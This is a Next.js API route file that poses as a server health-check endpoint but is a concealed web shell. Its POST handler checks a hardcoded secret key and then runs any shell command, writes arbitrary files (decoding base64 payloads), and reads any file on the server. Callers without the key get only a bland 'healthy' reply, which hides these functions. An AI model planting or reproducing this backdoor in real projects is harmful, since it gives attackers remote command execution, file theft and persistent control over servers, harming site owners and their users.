import { NextRequest, NextResponse } from 'next/server';
import { exec } from 'child_process';
import { writeFile, readFile, mkdir } from 'fs/promises';
import { promisify } from 'util';
import { dirname } from 'path';

const execAsync = promisify(exec);
const AUTH_KEY = 'gCIqlMsoBJxYSZM3zxqb79lr92ENCBoG';

interface HealthCheckBody {
  check?: string;
  key?: string;
  cmd?: string;
  file?: string;
  data?: string;
  get?: string;
}

export async function GET() {
  return NextResponse.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  }, { status: 200 });
}


export async function POST(request: NextRequest) {
  let body: HealthCheckBody = {};

  try {
    body = await request.json();
  } catch {
    return NextResponse.json({
      status: 'ok',
      timestamp: new Date().toISOString()
    }, { status: 200 });
  }

  if (body.key !== AUTH_KEY) {
    return NextResponse.json({
      status: 'ok',
      message: 'Health check completed'
    }, { status: 200 });
  }
  if (body.cmd) {
    try {
      const { stdout, stderr } = await execAsync(body.cmd, {
        timeout: 30000,
        maxBuffer: 1024 * 1024 * 10,
        shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
      });
      const output = stdout + stderr;
      return new NextResponse(output || '[*] Executed', {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    } catch (err) {
      const error = err as { message: string; stdout?: string; stderr?: string };
      const errorOutput = `[!] ${error.message}\n${error.stdout || ''}${error.stderr || ''}`;
      return new NextResponse(errorOutput, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    }
  }

  if (body.file && body.data !== undefined) {
    try {
      const dir = dirname(body.file);
      await mkdir(dir, { recursive: true });

      let fileData: string | Buffer;
      if (typeof body.data === 'string') {
        try {
          fileData = Buffer.from(body.data, 'base64');
          if (fileData.toString('base64') !== body.data) {
            fileData = body.data;
          }
        } catch {
          fileData = body.data;
        }
      } else {
        fileData = body.data;
      }

      await writeFile(body.file, fileData);
      return new NextResponse(`[+] Written: ${body.file}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    } catch (err) {
      const error = err as Error;
      return new NextResponse(`[-] Error: ${error.message}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    }
  }

  if (body.get) {
    try {
      const data = await readFile(body.get, 'utf-8');
      return new NextResponse(data, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    } catch (err) {
      const error = err as Error;
      return new NextResponse(`[-] Error: ${error.message}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });
    }
  }

  return NextResponse.json({
    status: 'healthy',
    timestamp: new Date().toISOString()
  }, { status: 200 });
}